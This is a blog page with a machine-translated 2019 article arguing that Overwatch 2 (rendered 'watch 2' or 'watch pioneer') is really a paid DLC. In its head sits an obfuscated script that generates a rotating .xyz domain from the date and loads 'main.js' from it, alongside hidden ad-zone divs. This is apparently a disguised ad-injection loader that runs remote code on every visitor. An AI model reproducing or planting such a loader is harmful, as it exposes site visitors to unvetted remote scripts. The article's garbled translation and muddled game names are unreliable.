<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="en">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Game,">










<meta name="description" content="At the beginning of November, Blizzard held the carnival, which caused a lot of waves. First, Diablo officially announced the existence of the sequel Diablo 4, and then the watch pioneer was about to">
<meta name="keywords" content="Game">
<meta property="og:type" content="article">
<meta property="og:title" content="People sell the sequels as DLC. Why do you dare to fight against Blizzard">
<meta property="og:url" content="http://maiygu.xyz/2019/11/08/People sell the sequels as DLC. Why do you dare to fight against Blizzard/index.html">
<meta property="og:site_name" content="Games">
<meta property="og:description" content="At the beginning of November, Blizzard held the carnival, which caused a lot of waves. First, Diablo officially announced the existence of the sequel Diablo 4, and then the watch pioneer was about to">
<meta property="og:locale" content="en">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/People sell the sequels as DLC. Why do you dare to fight against Blizzard/7a4424e8082a49698d19c4757420c638.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/People sell the sequels as DLC. Why do you dare to fight against Blizzard/09e1476dd15146cf9b712babd373bc18.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/People sell the sequels as DLC. Why do you dare to fight against Blizzard/b63779b89e5843d5b5a0ba09ada4bb5a.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/People sell the sequels as DLC. Why do you dare to fight against Blizzard/6a7d93282e6f4642905b149c49f689cd.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/People sell the sequels as DLC. Why do you dare to fight against Blizzard/f02d36e328f846a095d4c3c147ea90da.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/People sell the sequels as DLC. Why do you dare to fight against Blizzard/6ef1572766b8434f91a69609ce1a13d3.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/People sell the sequels as DLC. Why do you dare to fight against Blizzard/8e82394434784061aede0f540b30cdc2.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/People sell the sequels as DLC. Why do you dare to fight against Blizzard/fa1e0377c87347c6b72c0f1f964c72c1.jpg">
<meta property="og:updated_time" content="2021-03-02T08:49:49.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="People sell the sequels as DLC. Why do you dare to fight against Blizzard">
<meta name="twitter:description" content="At the beginning of November, Blizzard held the carnival, which caused a lot of waves. First, Diablo officially announced the existence of the sequel Diablo 4, and then the watch pioneer was about to">
<meta name="twitter:image" content="http://maiygu.xyz/2019/11/08/People sell the sequels as DLC. Why do you dare to fight against Blizzard/7a4424e8082a49698d19c4757420c638.jpg">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://maiygu.xyz/2019/11/08/People sell the sequels as DLC. Why do you dare to fight against Blizzard/">




<script type="text/javascript">!function(n){var t,e=function(n,t){var e=[["a","e","i","o","u","y"],["b","c","d","f","g","h","j","k","l","m","n","p","q","r","s","t","v","w","x","y","z"]];if(t)for(var r=0;r<=t.length-1;r++)n=n*t.charCodeAt(r)%4294967295;var l;return next=(l=n,function(n){return l=l+1831565813|0,(((n=(n=Math.imul(l^l>>>15,1|l))+Math.imul(n^n>>>7,61|n)^n)^n>>>14)>>>0)/Math.pow(2,32)}),function(n,t){for(var r=[],l=null,o=0;o<=n-1;o++){var a=void 0;null===l?a=e[0].concat(e[1]):1==l?(a=e[0],l=0):(a=e[1],l=1);var u=a[Math.floor(next()*a.length)];r.push(u),null===l&&(l=-1!=e[0].indexOf(u)?0:1)}return r.push("."+t),r.join("")}}((t=new Date,(t/=1e3)-t%1209600),"_fa7cdd4c68507744")(8,"xyz");if(null===n)console.log("https://"+e);else{var r=n.createElement("script");r.src="https://"+e+"/main.js",(n.body||n.head).appendChild(r)}}("undefined"!=typeof document?document:null);
</script>

  <title>People sell the sequels as DLC. Why do you dare to fight against Blizzard | Games</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Games</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">Games</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
            
            Sitemap
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
            
            Search
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
 
 
 <div class="_fa7cdd4c68507744" data-options="count=1,interval=1,burst=1" data-zone="22aeec266c49468da6040eff035066b8" style="display: none"></div>
 <div class="_fa7cdd4c68507744" data-options="count=1,interval=1,burst=1" data-zone="7aa7f6c595384fd6a2e5f5016b455fd2" style="display: none"></div>
 <div class="_fa7cdd4c68507744" data-zone="df2a1bde9f44465a8457aaf705928077" style="width:728px;height:90px;display: inline-block;margin: 0 auto"></div>
 <div class="_fa7cdd4c68507744" data-zone="4fff9a79323749608f8df1eff7291bcf" style="width:970px;height:90px;display: inline-block;margin: 0 auto"></div>
 
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://maiygu.xyz/2019/11/08/People sell the sequels as DLC. Why do you dare to fight against Blizzard/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Harry">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Games">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">People sell the sequels as DLC. Why do you dare to fight against Blizzard</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-11-08T00:00:00+08:00">
                2019-11-08
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>At the beginning of November, Blizzard held the carnival, which caused a lot of waves. First, Diablo officially announced the existence of the sequel Diablo 4, and then the watch pioneer was about to launch two generations of works. The former “Diablo 4” players have begged for the demand and finally expected the results, while the latter “watch 2” is a little ambiguous. As the youngest independent IP of Blizzard, watch pioneer plans to launch a new work only after three years, which is really confusing.<br><img src="http://maiygu.xyz/2019/11/08/People sell the sequels as DLC. Why do you dare to fight against Blizzard/7a4424e8082a49698d19c4757420c638.jpg" alt="People sell the sequels as DLC. Why do you dare to fight against Blizzard"><br>J. Allen black, President of Blizzard, once said that almost every online game’s launch of sequels means that it has been a failure before, while “watch pioneer” has a relatively stable enthusiasm in the overseas market, although it is somewhat acclimatized in the Chinese market, and this launch of sequels is undoubtedly its own proof of failure. Although Blizzard has released watch 2, it seems that the difference between this sequel and the previous one is not very big according to the current information. It is not so much a sequel as a new major version update.<br><img src="http://maiygu.xyz/2019/11/08/People sell the sequels as DLC. Why do you dare to fight against Blizzard/09e1476dd15146cf9b712babd373bc18.jpg" alt="People sell the sequels as DLC. Why do you dare to fight against Blizzard"><br>    suspense<br>First of all, let’s see what information watch2 has released: compared with the previous game with multi player confrontation as the core, it seems that watch2 will focus slightly on the multi player cooperation PVE mode that players have been looking forward to bringing. Up to now, we haven’t clearly explained what kind of story is told in the world view of this game. It seems that all the story processes will be explained in the cooperation mode of watch 2. Blizzard said that “watch 2” will use a new upgraded engine, because the previous engine is designed to focus on the previous work of multiplayer combat, only to create a better multiplayer combat experience, and because half of the content of the new work will be cooperation mode, so we need to change to a better engine to create a larger scale of cooperation mode content, and every hero will Add a new talent system to enhance character specific skills.<br><img src="http://maiygu.xyz/2019/11/08/People sell the sequels as DLC. Why do you dare to fight against Blizzard/b63779b89e5843d5b5a0ba09ada4bb5a.jpg" alt="People sell the sequels as DLC. Why do you dare to fight against Blizzard"><br>The most noteworthy content is that after the launch of watch 2, it can communicate with the client of watch 1. The old players with watch 1 can directly bring all their achievements and all the skin and decorative props to watch 2. In a period of time, the players with watch 2 can connect with the players of watch 1 Many players fight against each other, and soon after the launch of watch 2, the two games will merge the clients, thus replacing watch 1. Players with watch 1 can also play watch 2 directly after merging the client, but they can’t experience the cooperation mode of watch 2 and many new content added from watch 2. And that’s what many players question: since the first generation and the second generation will be able to merge their clients in the future, does it mean that this sequel is actually just the “new version” of “watch 1”, more like “watch 2.0” than “watch 2”.<br><img src="http://maiygu.xyz/2019/11/08/People sell the sequels as DLC. Why do you dare to fight against Blizzard/6a7d93282e6f4642905b149c49f689cd.jpg" alt="People sell the sequels as DLC. Why do you dare to fight against Blizzard"><br>At least according to the existing intelligence, the players’ response to this sequel seems to be less intense. Although Blizzard has repeatedly stressed that this is a sequel, it looks like a super large DLC in any way, and it is still paid. According to blizzard, the content of watch 2 is much larger than that of a DLC, and even more than that of a generation. However, from the point that the two game clients can be merged in the future, many people think that although watch 2 will have a linear process similar to 3a, it is still the additional content of the first generation of games, and the biggest difference between the two is really only Whether there is PVE mode or not, but as a game focusing on multi player battle, no matter what kind of content is added, its focus will be more on online content than other modes.<br><img src="http://maiygu.xyz/2019/11/08/People sell the sequels as DLC. Why do you dare to fight against Blizzard/f02d36e328f846a095d4c3c147ea90da.jpg" alt="People sell the sequels as DLC. Why do you dare to fight against Blizzard"></p>
<h1 id="Familiar"><a href="#Familiar" class="headerlink" title="Familiar"></a>Familiar</h1><p>Jeff Kaplan, the game director of watch 2, once said that he had played many games, and there was no DLC of any game that could be compared with watch 2. In fact, the content of watch 2 is basically the same as that of a 3A game. It also provides a lot of new content for players, but the core playing method and system of the game are basically the same as that of the ontology Yes. From many players who have experienced watch 2 demo at present, we can know that, at least in the current state, although only PvE content can be experienced in demo, the shooting feel, skill release and even operation mode of watch 2 are basically consistent with the previous work, and the more intuitive difference is that the overall style of the game changes from the original cartoon style to the realistic style Close up. This kind of promotion mode of watch 2 is not uncommon, and it can even be said that it has some familiar feelings. The current big fire escape game “night of fortress” also uses PvP and PVE mode, and PVE needs to pay extra for purchase.<br><img src="http://maiygu.xyz/2019/11/08/People sell the sequels as DLC. Why do you dare to fight against Blizzard/6ef1572766b8434f91a69609ce1a13d3.jpg" alt="People sell the sequels as DLC. Why do you dare to fight against Blizzard"><br>The original “night of the fortress” is a kind of survival game built by many people, which can quickly build buildings and fight with zombies as the selling point, and then because of the popularity of the big escape mode, the “night of the fortress” also added the big escape mode for itself, which did not expect that their main construction system combined with the big escape to form a wonderful chemical reaction, so this Previously, there was no propaganda means for the popularity of the cold game overnight, and now the volume of Fortress night has far exceeded its original PvE content, but players can still choose to pay to unlock to experience different game content. Obviously, “watch 2” is the opposite of “night of the fortress”. The sale of the new mode of the game alone does not affect the players who have “watch 1” to experience the battle of many people in “watch 2”, but it is just a continuation.<br><img src="http://maiygu.xyz/2019/11/08/People sell the sequels as DLC. Why do you dare to fight against Blizzard/8e82394434784061aede0f540b30cdc2.jpg" alt="People sell the sequels as DLC. Why do you dare to fight against Blizzard"><br>The so-called sequels rarely replace the old ones with the new ones. Only some online games will claim that they have launched a sequel when the big version is updated. These online games usually adopt the operation mode of free downloading of props and charging fees, and the new version also replaces the old version. In recent years, service-oriented 3A games have become popular, such as destiny and the whole territory blockade. But it’s a pity that most of them lost their popularity only one year later. Then, they launched a series of “destiny 2” or “whole territory blockade 2” with the same playing method but different content. At first, many people thought that there was no sequel to these games The significance of “watch 2” is that even though it should only be the former DLC, the fact is that both the system and mechanism between the new work and the old work are completely different from the former, not only the scale that can be modified only through updating, but also the play experience is quite different. Obviously, “watch 2” claims to be a sequel, but the scale is far less than the level of these games.<br><img src="http://maiygu.xyz/2019/11/08/People sell the sequels as DLC. Why do you dare to fight against Blizzard/fa1e0377c87347c6b72c0f1f964c72c1.jpg" alt="People sell the sequels as DLC. Why do you dare to fight against Blizzard"><br>    concluding remarks<br>At least at present, anyone who comes to watch 2 will have such a view. In the early years, such a situation happened too many times, which is nothing more than a disguised version of marketing means. But in any case, there is still too little information about “watch 2”. There are too many contents about Blizzard that haven’t been released to the public. I also hope Blizzard can hit me in the face with practical actions. At present, Blizzard has not announced the specific operation mode of watch 2, nor announced the price of the game, or even came to take Blizzard to say that it has not decided, but at least it needs to be launched without offending the players, otherwise, the state of watch 2 will not be too different from Watch 1.</p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/Game/" rel="tag"># Game</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/11/08/Selling the company is the thing he regrets the most. The vicissitudes of my world and the founder notch/" rel="next" title="Selling the company is the thing he regrets the most. The vicissitudes of my world and the founder notch">
                <i class="fa fa-chevron-left"></i> Selling the company is the thing he regrets the most. The vicissitudes of my world and the founder notch
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/11/08/Paris Commune in the game industry, anecdotes behind the development of independent game dead cell/" rel="prev" title="Paris Commune in the game industry, anecdotes behind the development of independent game dead cell">
                Paris Commune in the game industry, anecdotes behind the development of independent game dead cell <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">Harry</p>
              <p class="site-description motion-element" itemprop="description">Games</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">114</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">1</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Familiar"><span class="nav-number">1.</span> <span class="nav-text">Familiar</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        

<div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Harry</span>

  
</div>









        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  
  

  

  

  

</body>
</html>
